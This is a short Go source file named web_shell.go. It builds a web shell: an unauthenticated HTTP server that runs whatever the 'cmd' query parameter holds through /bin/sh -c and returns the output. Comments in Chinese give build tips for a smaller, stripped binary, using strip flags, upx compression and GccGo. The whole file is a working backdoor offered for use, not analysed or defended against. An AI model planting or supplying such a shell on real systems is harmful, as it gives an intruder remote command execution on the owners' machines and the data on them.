package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

var (
	shell = "/bin/sh"
	shellArg = "-c"
	addr string
)

// 6.1m - CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o gws web_shell.go
// 4.3m - CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o gws2 web_shell.go
// -s 的作用是去掉符号信息; -w 的作用是去掉调试信息
// method2: 用upx进一步压缩 upx -9 -o ./gws_upx ./gws
// method3: 用GccGo进行编译

func main() {
	if len(os.Args) !=2  {
		fmt.Printf("Usage: %s <listenAddress> , e.g. 0.0.0.0:7777\n", os.Args[0])
		os.Exit(1)
	}
	addr = os.Args[1]
	http.HandleFunc("/", requestHandler)
	err := http.ListenAndServe(addr, nil)
	_ = err
}

func requestHandler(w http.ResponseWriter, req *http.Request) {
	cmd := req.URL.Query().Get("cmd")
	if cmd == "" {
		return
	}

	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()
	//fmt.Printf("%T ->  %v\n",output,output)   // for debug
	_,err = w.Write([]byte(fmt.Sprintf("cmd: %v, result: \n%v\n",cmd, string(output))))
	_ = err
}